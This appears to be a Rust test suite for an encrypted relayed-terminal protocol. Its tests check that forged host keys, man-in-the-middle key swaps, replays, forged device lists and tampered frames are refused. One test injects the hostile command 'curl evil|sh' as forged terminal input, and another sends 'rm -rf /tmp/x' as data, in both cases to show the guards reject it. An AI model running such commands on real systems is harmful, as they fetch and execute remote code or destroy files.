//! ADR-0197 S2 acceptance ①: every refusal below is an independent test that
//! fails if the corresponding guard is removed (see the spike doc's sabotage log).

use momo_blind_pty::codec::*;
use momo_blind_pty::crypto;
use momo_blind_pty::handshake::{BoxAgent, DeviceClient, NonceStore};
use momo_blind_pty::harness::*;
use momo_blind_pty::session::{FrameKind, Session};
use momo_blind_pty::trust::*;
use momo_blind_pty::{Error, CHALLENGE_TTL_MS, MAX_PENDING};
use p256::ecdsa::SigningKey as DevSigningKey;

fn honest() -> BlindRelay {
    BlindRelay::default()
}

fn data(s: &mut Session, p: &[u8]) -> Vec<u8> {
    s.seal(FrameKind::Data, p).expect("seal")
}

#[test]
fn happy_path_bidirectional_pty_stream_and_authenticated_close() {
    let mut f = Fixture::new();
    let mut relay = honest();
    let (mut dev, mut bx) = f.attach(&mut relay).expect("attach");
    for i in 0..50u32 {
        let input = format!("echo {i}\n");
        let w = data(&mut dev, input.as_bytes());
        let w = relay.forward(Dir::DeviceToBox, w).remove(0);
        let (k, got) = bx.open(&w).expect("box open");
        assert_eq!((k, got.as_slice()), (FrameKind::Data, input.as_bytes()));
        let out = data(&mut bx, format!("{i}\r\n").as_bytes());
        let out = relay.forward(Dir::BoxToDevice, out).remove(0);
        let (_, got) = dev.open(&out).expect("dev open");
        assert_eq!(got, format!("{i}\r\n").as_bytes());
    }
    let close = bx.seal(FrameKind::Close, &[]).unwrap();
    dev.open(&close).unwrap();
    assert!(dev.peer_closed());
}

// ---- trust chain: runner fingerprint, runner attestation, owner endorsement ----

#[test]
fn box_never_opens_before_runner_fingerprint_comparison() {
    let f = Fixture::new();
    let host_pub = f.host.verifying_key().to_bytes();
    let att = f.runner.attest_host(&f.box_id, &host_pub);
    let list = DeviceListState::bootstrap(f.list_v1.clone()).unwrap();

    // No fingerprint typed in at all: cannot pin, cannot attach.
    let mut c = DeviceClient::new(f.dev_a.clone(), list.clone());
    assert_eq!(
        c.pin_host(f.box_id, host_pub, f.runner.public(), att)
            .unwrap_err(),
        Error::HostNotPinned
    );
    assert_eq!(c.hello(f.box_id).err(), Some(Error::HostNotPinned));

    // Wrong fingerprint typed (e.g. the server showed the member a different one).
    let other = Runner::from_seed([77; 32]);
    let mut c = DeviceClient::new(f.dev_a.clone(), list);
    c.set_runner_fingerprint(other.fingerprint());
    assert_eq!(
        c.pin_host(f.box_id, host_pub, f.runner.public(), att)
            .unwrap_err(),
        Error::RunnerFingerprintMismatch
    );
    assert_eq!(c.hello(f.box_id).err(), Some(Error::HostNotPinned));
}

#[test]
fn host_key_without_runner_attestation_is_refused() {
    let f = Fixture::new();
    let list = DeviceListState::bootstrap(f.list_v1.clone()).unwrap();
    let mut c = DeviceClient::new(f.dev_a.clone(), list);
    c.set_runner_fingerprint(f.runner.fingerprint());
    // A server-made host key, "attested" by nobody the member trusts.
    let evil_host = ed25519_dalek::SigningKey::from_bytes(&[55; 32]);
    let evil_pub = evil_host.verifying_key().to_bytes();
    let evil_runner = Runner::from_seed([56; 32]);
    let bogus_att = evil_runner.attest_host(&f.box_id, &evil_pub);
    // Right runner key bytes, forged attestation signature:
    assert_eq!(
        c.pin_host(f.box_id, evil_pub, f.runner.public(), bogus_att)
            .unwrap_err(),
        Error::HostNotAttested
    );
    // Attacker's own runner key: fingerprint differs from the typed one.
    assert_eq!(
        c.pin_host(f.box_id, evil_pub, evil_runner.public(), bogus_att)
            .unwrap_err(),
        Error::RunnerFingerprintMismatch
    );
    // A genuine attestation, but for another box (cut-and-paste across boxes).
    let host_pub = f.host.verifying_key().to_bytes();
    let other_box = [1u8; BOX_ID_LEN];
    let att_other = f.runner.attest_host(&other_box, &host_pub);
    assert_eq!(
        c.pin_host(f.box_id, host_pub, f.runner.public(), att_other)
            .unwrap_err(),
        Error::HostNotAttested
    );
}

#[test]
fn host_key_without_owner_endorsement_is_refused() {
    let f = Fixture::new();
    let host_pub = f.host.verifying_key().to_bytes();
    let att = f.runner.attest_host(&f.box_id, &host_pub);
    let fp = f.runner.fingerprint();
    let msg = HostPin::endorse_bytes(&f.box_id, &host_pub, &fp, &att);
    let mk = |signer: &DevSigningKey, sig_from: &DevSigningKey| HostPin {
        box_id: f.box_id,
        host_pub,
        runner_pub: f.runner.public(),
        attestation: att,
        signer_dev: dev_pub(signer),
        sig_owner: sign_dev(sig_from, &msg),
    };
    let mut c = DeviceClient::new(
        f.dev_a.clone(),
        DeviceListState::bootstrap(f.list_v1.clone()).unwrap(),
    );
    c.set_runner_fingerprint(fp);

    // Server signs with its own P-256 key (not on the owner list).
    let server = dev_key(99);
    assert_eq!(
        c.import_pin(mk(&server, &server)).unwrap_err(),
        Error::HostNotEndorsed
    );
    // Claims to be the owner device but the signature is the server's.
    assert_eq!(
        c.import_pin(mk(&f.dev_a, &server)).unwrap_err(),
        Error::HostNotEndorsed
    );
    // The genuine record is accepted and unlocks hello().
    c.import_pin(mk(&f.dev_a, &f.dev_a)).expect("genuine pin");
    assert!(c.hello(f.box_id).is_ok());
}

#[test]
fn changed_host_key_is_never_silently_accepted() {
    let mut f = Fixture::new();
    // The runner would also attest a *second* key (e.g. box rebuilt), but the
    // device already pinned the first one: it must not overwrite.
    let new_host = ed25519_dalek::SigningKey::from_bytes(&[60; 32]);
    let np = new_host.verifying_key().to_bytes();
    let att = f.runner.attest_host(&f.box_id, &np);
    assert_eq!(
        f.client
            .pin_host(f.box_id, np, f.runner.public(), att)
            .unwrap_err(),
        Error::HostKeyChanged
    );
}

#[test]
fn relay_substituting_its_own_host_key_or_signature_is_detected() {
    // (a) relay swaps in a whole Challenge from its own host key.
    let mut f = Fixture::new();
    let attacker = ed25519_dalek::SigningKey::from_bytes(&[61; 32]);
    let mut r = FnRelay(|dir, m: Vec<u8>| {
        if dir == Dir::BoxToDevice && m[0] == Challenge::TAG {
            let mut c = Challenge::from_bytes(&m).unwrap();
            c.host_pub = attacker.verifying_key().to_bytes();
            return vec![c.to_bytes()];
        }
        vec![m]
    });
    assert_eq!(f.attach(&mut r).err(), Some(Error::HostKeyChanged));

    // (b) relay claims the pinned key but signs with its own.
    let mut f = Fixture::new();
    let mut r = FnRelay(|dir, m: Vec<u8>| {
        if dir == Dir::BoxToDevice && m[0] == Challenge::TAG {
            let mut c = Challenge::from_bytes(&m).unwrap();
            c.sig_box = sign_ed(&attacker, b"anything");
            return vec![c.to_bytes()];
        }
        vec![m]
    });
    assert_eq!(f.attach(&mut r).err(), Some(Error::BadHostSignature));
}

#[test]
fn ephemeral_key_substitution_mitm_is_detected_by_transcript_signatures() {
    // Relay swaps the device's ephemeral key for its own before the box sees it.
    let mut f = Fixture::new();
    let mitm = crypto::Ephemeral::generate().unwrap();
    let mut r = FnRelay(|dir, m: Vec<u8>| {
        if dir == Dir::DeviceToBox && m[0] == Hello::TAG {
            let mut h = Hello::from_bytes(&m).unwrap();
            h.eph_d = mitm.public;
            return vec![h.to_bytes()];
        }
        vec![m]
    });
    // Box signs a transcript containing the attacker's eph; the device's own
    // transcript has the real one, so the host signature does not verify.
    assert_eq!(f.attach(&mut r).err(), Some(Error::BadHostSignature));

    // Relay swaps the box's ephemeral key.
    let mut f = Fixture::new();
    let mut r = FnRelay(|dir, m: Vec<u8>| {
        if dir == Dir::BoxToDevice && m[0] == Challenge::TAG {
            let mut c = Challenge::from_bytes(&m).unwrap();
            c.eph_b = mitm.public;
            return vec![c.to_bytes()];
        }
        vec![m]
    });
    assert_eq!(f.attach(&mut r).err(), Some(Error::BadHostSignature));
}

// ---- owner device list ----

#[test]
fn device_list_rollback_and_server_forged_lists_are_rejected() {
    let mut f = Fixture::new();
    let a = dev_pub(&f.dev_a);
    let b = dev_pub(&f.dev_b);
    let v2 = DeviceList::sign(f.box_id, 2, vec![a, b], &f.dev_a);
    f.agent.on_device_list(v2.clone()).expect("v2");
    assert_eq!(f.agent.device_list_version(), 2);

    // Old list re-sent by the server, and the same version again.
    assert_eq!(
        f.agent.on_device_list(f.list_v1.clone()).unwrap_err(),
        Error::DeviceListRollback
    );
    assert_eq!(
        f.agent.on_device_list(v2).unwrap_err(),
        Error::DeviceListRollback
    );

    // Server-minted list: highest version, but signed by a key not on the list.
    let server = dev_key(99);
    let forged = DeviceList::sign(f.box_id, 50, vec![dev_pub(&server)], &server);
    assert_eq!(
        f.agent.on_device_list(forged).unwrap_err(),
        Error::DeviceListBadSigner
    );
    // Valid owner signature, tampered body (adds the server key afterwards).
    let mut tampered = DeviceList::sign(f.box_id, 3, vec![a], &f.dev_a);
    tampered.devices.push(dev_pub(&server));
    assert_eq!(
        f.agent.on_device_list(tampered).unwrap_err(),
        Error::DeviceListBadSigner
    );
    assert_eq!(f.agent.device_list_version(), 2);

    // Revocation takes effect for new attaches.
    let v3 = DeviceList::sign(f.box_id, 3, vec![a], &f.dev_a);
    f.agent.on_device_list(v3).unwrap();
    let mut cb = DeviceClient::new(
        f.dev_b.clone(),
        DeviceListState::bootstrap(f.list_v1.clone()).unwrap(),
    );
    cb.on_device_list(DeviceList::sign(f.box_id, 2, vec![a, b], &f.dev_a))
        .unwrap();
    cb.set_runner_fingerprint(f.runner.fingerprint());
    let hp = f.host.verifying_key().to_bytes();
    cb.pin_host(
        f.box_id,
        hp,
        f.runner.public(),
        f.runner.attest_host(&f.box_id, &hp),
    )
    .unwrap();
    assert_eq!(
        attach(&cb, &mut f.agent, &mut honest()).err(),
        Some(Error::UnknownDevice)
    );
}

// ---- server impersonating a device ----

#[test]
fn server_posing_as_a_device_gets_no_session_and_no_pty_input() {
    let mut f = Fixture::new();
    let server = dev_key(99);

    // (a) Unlisted key: no challenge is even issued.
    let mut rogue = DeviceClient::new(
        server.clone(),
        DeviceListState::bootstrap(DeviceList::sign(
            f.box_id,
            1,
            vec![dev_pub(&server)],
            &server,
        ))
        .unwrap(),
    );
    rogue.set_runner_fingerprint(f.runner.fingerprint());
    let hp = f.host.verifying_key().to_bytes();
    rogue
        .pin_host(
            f.box_id,
            hp,
            f.runner.public(),
            f.runner.attest_host(&f.box_id, &hp),
        )
        .unwrap();
    assert_eq!(
        attach(&rogue, &mut f.agent, &mut honest()).err(),
        Some(Error::UnknownDevice)
    );

    // (b) Server presents the owner's public key but signs with its own key:
    // it gets a challenge (the pubkey is public) but the Auth is refused, so
    // no Session ever exists on the box side to accept PTY input.
    let hello = Hello {
        box_id: f.box_id,
        dev_pub: dev_pub(&f.dev_a),
        nonce_d: crypto::random().unwrap(),
        eph_d: crypto::Ephemeral::generate().unwrap().public,
    };
    let ch = f.agent.on_hello(hello).unwrap();
    let forged = Auth {
        nonce_b: ch.nonce_b,
        sig_dev: sign_dev(&server, b"whatever"),
    };
    assert_eq!(
        f.agent.on_auth(forged).err(),
        Some(Error::BadDeviceSignature)
    );
    // The challenge is burnt: retrying even with garbage cannot reuse it.
    let again = Auth {
        nonce_b: ch.nonce_b,
        sig_dev: [0; SIG_LEN],
    };
    assert_eq!(f.agent.on_auth(again).err(), Some(Error::ChallengeUnknown));
}

// ---- replay / expiry ----

#[test]
fn attach_signature_replay_is_refused_including_after_agent_restart() {
    let mut f = Fixture::new();
    let mut captured: Vec<Vec<u8>> = vec![];
    let mut r = FnRelay(|dir, m: Vec<u8>| {
        if dir == Dir::DeviceToBox && m[0] == Auth::TAG {
            captured.push(m.clone());
        }
        vec![m]
    });
    f.attach(&mut r).expect("legit attach");
    let auth = Auth::from_bytes(&captured[0]).unwrap();

    // Same agent: the challenge is spent.
    assert_eq!(
        f.agent.on_auth(auth.clone()).err(),
        Some(Error::ChallengeUnknown)
    );

    // Box-agent restarts, nonce store reloaded from disk.
    let persisted = f.agent.nonce_store().to_bytes();
    assert!(persisted.windows(NONCE_LEN).any(|w| w == auth.nonce_b));
    let restored = NonceStore::from_bytes(&persisted).unwrap();
    let mut f2 = Fixture::with_nonce_store(restored);
    assert_eq!(
        f2.agent.on_auth(auth.clone()).err(),
        Some(Error::ChallengeUnknown)
    );
    // ...and a restart that LOST the store is still safe: pending state is gone.
    let mut f3 = Fixture::new();
    assert_eq!(f3.agent.on_auth(auth).err(), Some(Error::ChallengeUnknown));
}

#[test]
fn old_auth_replayed_against_a_fresh_challenge_fails() {
    let mut f = Fixture::new();
    let mut captured = None;
    let mut r = FnRelay(|dir, m: Vec<u8>| {
        if dir == Dir::DeviceToBox && m[0] == Auth::TAG {
            captured = Some(Auth::from_bytes(&m).unwrap());
        }
        vec![m]
    });
    f.attach(&mut r).unwrap();
    let old = captured.unwrap();

    // New attach in flight; the relay substitutes the old (valid-once) Auth,
    // patching in the new challenge's nonce so the lookup succeeds.
    let (hello, _hs) = f.client.hello(f.box_id).unwrap();
    let ch = f.agent.on_hello(hello).unwrap();
    let spliced = Auth {
        nonce_b: ch.nonce_b,
        sig_dev: old.sig_dev,
    };
    assert_eq!(
        f.agent.on_auth(spliced).err(),
        Some(Error::BadDeviceSignature)
    );
}

#[test]
fn expired_challenge_is_refused() {
    let mut f = Fixture::new();
    let (hello, hs) = f.client.hello(f.box_id).unwrap();
    let ch = f.agent.on_hello(hello).unwrap();
    let (auth, _dev) = hs.on_challenge(ch).unwrap();
    f.clock.advance(CHALLENGE_TTL_MS + 1);
    assert_eq!(f.agent.on_auth(auth).err(), Some(Error::Expired));

    // Boundary: exactly at expiry is still valid.
    let mut f = Fixture::new();
    let (hello, hs) = f.client.hello(f.box_id).unwrap();
    let ch = f.agent.on_hello(hello).unwrap();
    let (auth, _d) = hs.on_challenge(ch).unwrap();
    f.clock.advance(CHALLENGE_TTL_MS);
    assert!(f.agent.on_auth(auth).is_ok());
}

#[test]
fn pending_challenges_are_capped_before_authentication() {
    let mut f = Fixture::new();
    for _ in 0..MAX_PENDING {
        let (h, _) = f.client.hello(f.box_id).unwrap();
        f.agent.on_hello(h).unwrap();
    }
    let (h, _) = f.client.hello(f.box_id).unwrap();
    assert_eq!(f.agent.on_hello(h).err(), Some(Error::TooManyPending));
    f.clock.advance(CHALLENGE_TTL_MS + 1); // expired ones are reclaimed
    let (h, _) = f.client.hello(f.box_id).unwrap();
    assert!(f.agent.on_hello(h).is_ok());
}

#[test]
fn hello_for_another_box_is_refused() {
    let mut f = Fixture::new();
    let (mut h, _) = f.client.hello(f.box_id).unwrap();
    h.box_id = [3; BOX_ID_LEN];
    assert_eq!(f.agent.on_hello(h).err(), Some(Error::WrongBox));
}

// ---- record layer: tamper / inject / replay / reconnect ----

#[test]
fn relay_flipping_one_ciphertext_bit_is_detected() {
    let mut f = Fixture::new();
    let (mut dev, mut bx) = f.attach(&mut honest()).unwrap();
    for bit in [8 * 8, 8 * 12 + 3] {
        // first: a bit in the AEAD body; the counter bytes are covered below
        let mut w = data(&mut dev, b"rm -rf /tmp/x\n");
        let i = bit / 8;
        w[i] ^= 1 << (bit % 8);
        assert_eq!(bx.open(&w).err(), Some(Error::Decrypt));
        // After a failure the session is dead: no later frame is accepted.
        let w2 = data(&mut dev, b"ok\n");
        assert_eq!(bx.open(&w2).err(), Some(Error::Closed));
        let (d2, b2) = f.attach(&mut honest()).unwrap();
        dev = d2;
        bx = b2;
    }
}

#[test]
fn relay_cannot_edit_the_counter_or_reorder_drop_duplicate() {
    let mut f = Fixture::new();
    let (mut dev, mut bx) = f.attach(&mut honest()).unwrap();
    let w0 = data(&mut dev, b"a");
    let w1 = data(&mut dev, b"b");
    let w2 = data(&mut dev, b"c");
    // Reorder: w1 before w0.
    assert_eq!(bx.open(&w1).err(), Some(Error::Counter));
    // (dead session) -- use a fresh one for each manipulation
    let (mut dev, mut bx) = f.attach(&mut honest()).unwrap();
    let w0b = data(&mut dev, b"a");
    let _w1b = data(&mut dev, b"b");
    let w2b = data(&mut dev, b"c");
    bx.open(&w0b).unwrap();
    // Drop w1: w2 arrives with a gap.
    assert_eq!(bx.open(&w2b).err(), Some(Error::Counter));
    // Duplicate: delivered twice.
    let (mut dev, mut bx) = f.attach(&mut honest()).unwrap();
    let wa = data(&mut dev, b"a");
    bx.open(&wa).unwrap();
    assert_eq!(bx.open(&wa).err(), Some(Error::Counter));
    // Counter rewritten to the expected value: AEAD nonce/AAD no longer match.
    let (mut dev, mut bx) = f.attach(&mut honest()).unwrap();
    let _skip = data(&mut dev, b"x");
    let mut w = data(&mut dev, b"y");
    w[..8].copy_from_slice(&0u64.to_be_bytes());
    assert_eq!(bx.open(&w).err(), Some(Error::Decrypt));
    let _ = (w0, w2);
}

#[test]
fn relay_injecting_frames_without_the_session_key_is_detected() {
    let mut f = Fixture::new();
    let (mut dev, mut bx) = f.attach(&mut honest()).unwrap();
    let w = data(&mut dev, b"ls\n");
    bx.open(&w).unwrap();

    // Well-formed frame with the correct next counter under a key the relay made up.
    let rogue_key: [u8; 32] = crypto::random().unwrap();
    let mut forged = 1u64.to_be_bytes().to_vec();
    let mut pt = vec![FrameKind::Data as u8];
    pt.extend_from_slice(b"curl evil|sh\n");
    forged.extend_from_slice(&crypto::seal(&rogue_key, 1, b"aad", &pt));
    assert_eq!(bx.open(&forged).err(), Some(Error::Decrypt));

    // Raw plaintext with a plausible header.
    let (_d, mut bx) = f.attach(&mut honest()).unwrap();
    let mut plain = 0u64.to_be_bytes().to_vec();
    plain.extend_from_slice(b"\x00curl evil|sh\n");
    assert_eq!(bx.open(&plain).err(), Some(Error::Decrypt));
}

#[test]
fn reflecting_a_frame_back_at_its_sender_is_detected() {
    // The two directions use different keys and a direction byte in the AAD, so
    // a frame bounced back at its sender fails even when its counter fits.
    let mut f = Fixture::new();
    let (mut dev, mut bx) = f.attach(&mut honest()).unwrap();
    let d0 = data(&mut dev, b"x");
    let d1 = data(&mut dev, b"secret-ish"); // d2b counter 1
    bx.open(&d0).unwrap();
    assert_eq!(dev.open(&d1).err(), Some(Error::Decrypt)); // device expects b2d counter 1

    let (mut dev, mut bx) = f.attach(&mut honest()).unwrap();
    let d0 = data(&mut dev, b"x");
    bx.open(&d0).unwrap();
    let b1 = data(&mut bx, b"out"); // b2d counter 1 (Ready was 0)
    assert_eq!(bx.open(&b1).err(), Some(Error::Decrypt)); // box expects d2b counter 1
}

#[test]
fn reconnect_derives_fresh_keys_so_old_frames_and_counters_are_dead() {
    let mut f = Fixture::new();
    let (mut dev1, mut bx1) = f.attach(&mut honest()).unwrap();
    let old0 = data(&mut dev1, b"first session, counter 0");
    bx1.open(&old0).unwrap();

    // Reconnect = new handshake. Counters restart at 0, so counter 0 of the old
    // session is exactly what the new session expects: only key separation
    // stops it.
    let (_dev2, mut bx2) = f.attach(&mut honest()).unwrap();
    assert_eq!(bx2.open(&old0).err(), Some(Error::Decrypt));

    // And the new session works for its own traffic.
    let (mut dev3, mut bx3) = f.attach(&mut honest()).unwrap();
    let ok = data(&mut dev3, b"fresh");
    assert_eq!(bx3.open(&ok).unwrap().1, b"fresh");
}

#[test]
fn spoofed_ready_and_early_data_toward_the_device_are_refused() {
    let mut f = Fixture::new();
    let (hello, hs) = f.client.hello(f.box_id).unwrap();
    let ch = f.agent.on_hello(hello).unwrap();
    let (auth, mut dev) = hs.on_challenge(ch).unwrap();
    // The relay never forwards Auth, so the box never derived keys; it hands
    // the device a frame of its own making instead of the box's Ready.
    let junk = crypto::seal(&[5; 32], 0, b"", &[FrameKind::Ready as u8]);
    let mut w = 0u64.to_be_bytes().to_vec();
    w.extend_from_slice(&junk);
    assert_eq!(dev.open(&w).err(), Some(Error::Decrypt));
    let _ = auth;
}

#[test]
fn truncation_by_the_relay_is_visible_as_a_missing_close() {
    let mut f = Fixture::new();
    let (mut dev, mut bx) = f.attach(&mut honest()).unwrap();
    let w = data(&mut bx, b"last output");
    // Relay delivers the data frame, then swallows the Close that follows.
    let _close = bx.seal(FrameKind::Close, &[]).unwrap();
    dev.open(&w).unwrap();
    assert!(
        !dev.peer_closed(),
        "stream ended without an authenticated Close"
    );
}

#[test]
fn sizes_are_bounded() {
    let mut f = Fixture::new();
    let (mut dev, _) = f.attach(&mut honest()).unwrap();
    let big = vec![0u8; momo_blind_pty::MAX_PAYLOAD + 1];
    assert_eq!(dev.seal(FrameKind::Data, &big).err(), Some(Error::TooLarge));
}

#[allow(dead_code)]
fn _types(_: &BoxAgent) {}

#[test]
fn unlisted_device_gets_no_challenge() {
    let mut f = Fixture::new();
    let server = dev_key(99);
    let hello = Hello {
        box_id: f.box_id,
        dev_pub: dev_pub(&server),
        nonce_d: crypto::random().unwrap(),
        eph_d: crypto::Ephemeral::generate().unwrap().public,
    };
    // Checked directly (not through attach) so the early refusal is what is
    // pinned, independent of the later signature check.
    assert_eq!(f.agent.on_hello(hello).err(), Some(Error::UnknownDevice));
}

#[test]
fn device_revoked_between_hello_and_auth_cannot_finish() {
    let mut f = Fixture::new();
    let (hello, hs) = f.client.hello(f.box_id).unwrap();
    let ch = f.agent.on_hello(hello).unwrap();
    let (auth, _dev) = hs.on_challenge(ch).unwrap();
    // Owner (device A) replaces the list with B only, A revokes itself.
    let v2 = DeviceList::sign(f.box_id, 2, vec![dev_pub(&f.dev_b)], &f.dev_a);
    f.agent.on_device_list(v2).unwrap();
    assert_eq!(f.agent.on_auth(auth).err(), Some(Error::UnknownDevice));
}

#[test]
fn box_provisioned_with_a_server_chosen_device_is_caught_by_the_owner_audit() {
    let f = Fixture::new();
    let server = dev_key(99);
    // Compromised server provisions the box with [owner, server-device], signed
    // by the server's device (the only key it controls).
    let dirty = DeviceList::sign(
        f.box_id,
        1,
        vec![dev_pub(&f.dev_a), dev_pub(&server)],
        &server,
    );
    let agent = BoxAgent::new(
        f.box_id,
        f.host.clone(),
        DeviceListState::bootstrap(dirty).unwrap(),
        NonceStore::default(),
        f.clock.clone(),
    );
    // The owner attaches fine (the box accepts the owner's key) ...
    let mut agent = agent;
    assert!(attach(&f.client, &mut agent, &mut honest()).is_ok());
    // ... but the audit of the list the box really enforces refuses it.
    assert_eq!(
        f.client.audit_box_list(agent.device_list()).err(),
        Some(Error::BoxListUntrusted)
    );
    // The genuine list passes.
    assert!(f.client.audit_box_list(&f.list_v1).is_ok());
    // A list that adds an unknown signer-less key to a genuine one fails too.
    let mut tampered = f.list_v1.clone();
    tampered.devices.push(dev_pub(&server));
    assert_eq!(
        f.client.audit_box_list(&tampered).err(),
        Some(Error::BoxListUntrusted)
    );
}

#[test]
fn owner_audit_checks_signer_and_member_set_independently() {
    let f = Fixture::new();
    let server = dev_key(99);
    let a = dev_pub(&f.dev_a);
    // Every listed device is known, but the list is signed by an unknown key.
    let unknown_signer = DeviceList::sign(f.box_id, 1, vec![a], &server);
    assert_eq!(
        f.client.audit_box_list(&unknown_signer).err(),
        Some(Error::BoxListUntrusted)
    );
    // Signed by the owner, yet it lists a device the owner never approved.
    let extra_member = DeviceList::sign(f.box_id, 1, vec![a, dev_pub(&server)], &f.dev_a);
    assert_eq!(
        f.client.audit_box_list(&extra_member).err(),
        Some(Error::BoxListUntrusted)
    );
}
